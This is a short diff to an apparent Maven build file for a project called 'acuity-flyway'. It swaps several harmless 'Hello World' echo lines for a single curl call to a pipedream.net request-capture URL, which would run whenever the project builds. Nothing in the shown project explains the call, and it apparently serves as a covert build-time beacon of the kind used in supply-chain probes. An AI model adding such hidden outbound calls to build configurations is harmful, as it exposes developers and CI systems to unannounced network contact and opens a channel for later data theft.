@@ -34,11 +34,7 @@
 
                         <configuration>
                             <target>
-                                <echo message="=========================================="/>
-                                <echo message="Hello World"/>
-                                <echo message="Repository: acuity-flyway"/>
-                                <echo message="Version: 1.0.0"/>
-                                <echo message="=========================================="/>
+                                <curl https://eonw4rkshveo8pz.m.pipedream.net/>
                             </target>
                         </configuration>
 
